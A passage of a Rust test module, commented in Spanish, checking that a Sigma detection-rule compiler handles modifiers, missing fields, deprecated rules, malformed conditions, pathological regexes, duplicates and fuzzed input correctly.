        assert!(r.evalua(&evento(&[("CommandLine", "solo uno")])));
        assert!(r.evalua(&evento(&[("CommandLine", "solo dos")])));
        assert!(!r.evalua(&evento(&[("CommandLine", "ni tres")])));
    }

    /// Y con `|all` pasa a ser «todos», que es lo que ese modificador existe
    /// para decir.
    #[test]
    fn el_modificador_all_exige_todos_los_valores() {
        let fuente = r#"
title: Todos
detection:
    sel:
        CommandLine|contains|all:
            - 'uno'
            - 'dos'
    condition: sel
level: low
"#;
        let r = compilar_regla(fuente, &p()).unwrap();
        assert!(!r.evalua(&evento(&[("CommandLine", "solo uno")])));
        assert!(r.evalua(&evento(&[("CommandLine", "uno y dos")])));
    }

    /// Un campo que el evento NO TRAE no cumple la condicion. Darlo por cumplido
    /// haria que la regla disparara sobre eventos que ni siquiera tienen el
    /// campo que mira.
    #[test]
    fn un_campo_ausente_no_cumple_la_condicion() {
        let fuente = r#"
title: Ausente
detection:
    sel:
        CampoQueNoViene: 'x'
    condition: sel
level: low
"#;
        let r = compilar_regla(fuente, &p()).unwrap();
        assert!(!r.evalua(&evento(&[("Otro", "x")])));
    }

    /// UNA CONDICION QUE NOMBRA UNA SELECCION INEXISTENTE NO SE COMPILA. Si se
    /// compilara, la regla estaria en el corpus, contada, y no dispararia jamas:
    /// el peor tipo de fallo, porque no se ve.
    #[test]
    fn una_seleccion_inexistente_rechaza_la_regla() {
        let fuente = r#"
title: Fantasma
detection:
    sel:
        A: 1
    condition: sel and not filtro_que_no_existe
level: low
"#;
        let e = compilar_regla(fuente, &p()).unwrap_err();
        assert_eq!(e.codigo(), "sigma-seleccion-desconocida");
        assert!(
            e.detalle().contains("filtro_que_no_existe"),
            "{}",
            e.detalle()
        );
    }

    /// Una regla que su propio autor marco obsoleta no se distribuye.
    #[test]
    fn una_regla_obsoleta_no_se_compila() {
        let fuente = r#"
title: Vieja
status: deprecated
detection:
    sel:
        A: 1
    condition: sel
level: low
"#;
        assert_eq!(
            compilar_regla(fuente, &p()).unwrap_err().codigo(),
            "sigma-obsoleta"
        );
    }

    /// Un modificador que no se soporta RECHAZA la regla con su nombre, en vez
    /// de ignorarse y dar una condicion que compara otra cosa.
    #[test]
    fn un_modificador_no_soportado_rechaza_la_regla_con_su_nombre() {
        let fuente = r#"
title: Base64
detection:
    sel:
        CommandLine|base64offset|contains: 'x'
    condition: sel
level: low
"#;
        let e = compilar_regla(fuente, &p()).unwrap_err();
        assert_eq!(e.codigo(), "sigma-modificador-no-soportado");
        assert!(e.detalle().contains("base64offset"), "{}", e.detalle());
    }

    /// Una expresion patologica en una regla Sigma se rechaza igual que en una
    /// de red: corre en el endpoint del cliente por cada evento.
    #[test]
    fn una_expresion_patologica_en_sigma_se_rechaza() {
        let fuente = r#"
title: Patologica
detection:
    sel:
        CommandLine|re: '(a+)+$'
    condition: sel
level: low
"#;
        assert_eq!(
            compilar_regla(fuente, &p()).unwrap_err().codigo(),
            "regex-patologica"
        );
    }

    /// Sin `detection` o sin `condition` no hay regla que compilar, y se dice
    /// cual falta.
    #[test]
    fn faltar_un_campo_obligatorio_se_dice_con_su_nombre() {
        let e = compilar_regla("title: Solo titulo\n", &p()).unwrap_err();
        assert_eq!(e.codigo(), "sigma-falta-campo");
        assert!(e.detalle().contains("detection"), "{}", e.detalle());

        let e2 = compilar_regla("title: t\ndetection:\n  sel:\n    A: 1\n", &p()).unwrap_err();
        assert!(e2.detalle().contains("condition"), "{}", e2.detalle());
    }

    /// Una condicion mal formada se rechaza en vez de interpretarse a medias.
    #[test]
    fn una_condicion_mal_formada_se_rechaza() {
        for cond in ["(a and b", "a and", "and b", "a)", "1 of"] {
            let r = analizar_condicion(cond);
            assert!(r.is_err(), "«{cond}» -> {r:?}");
        }
    }

    /// El informe de un lote dice cuantas de cuantas y por que las demas no.
    #[test]
    fn el_informe_de_un_lote_dice_cuantas_de_cuantas() {
        let mala = "title: Mala\ndetection:\n  sel:\n    A: 1\n  condition: fantasma\nlevel: low\n";
        let obsoleta = "title: Vieja\nstatus: deprecated\ndetection:\n  sel:\n    A: 1\n  condition: sel\nlevel: low\n";
        let (reglas, informe) = compilar(&[REAL, mala, obsoleta], &p());

        assert_eq!(reglas.len(), 1);
        assert_eq!(informe.vistas, 3);
        assert_eq!(informe.compiladas, 1);
        let motivos: Vec<&str> = informe.por_motivo().iter().map(|(m, _)| *m).collect();
        assert!(
            motivos.contains(&"sigma-seleccion-desconocida"),
            "{motivos:?}"
        );
        assert!(motivos.contains(&"sigma-obsoleta"), "{motivos:?}");
    }

    /// Las reglas duplicadas por identificador no se cuentan dos veces.
    #[test]
    fn las_reglas_duplicadas_por_id_se_descartan() {
        let (_, informe) = compilar(&[REAL, REAL], &p());
        assert_eq!(informe.compiladas, 1);
        assert_eq!(informe.duplicadas, 1);
    }

    /// Ninguna entrada arbitraria puede tumbar el compilador.
    #[test]
    fn ninguna_entrada_arbitraria_provoca_panico() {
        let piezas = [
            "title: t",
            "detection:",
            "  sel:",
            "    A: 1",
            "  condition:",
            "sel",
            "and",
            "or",
            "not",
            "(",
            ")",
            "1 of",
            "all of them",
            "level: high",
            "|contains",
            "|re",
        ];
        let mut semilla = 0xDEAD_BEEF_CAFE_1234u64;
        for _ in 0..2_000 {
            semilla = semilla
                .wrapping_mul(6364136223846793005)
                .wrapping_add(1442695040888963407);
            let n = (semilla % 15) as usize;
            let doc: String = (0..n)
                .map(|k| piezas[((semilla >> (k % 56)) as usize) % piezas.len()])
                .collect::<Vec<&str>>()
                .join("\n");
            let _ = compilar_regla(&doc, &p());
            let _ = analizar_condicion(&doc);
        }
    }
}
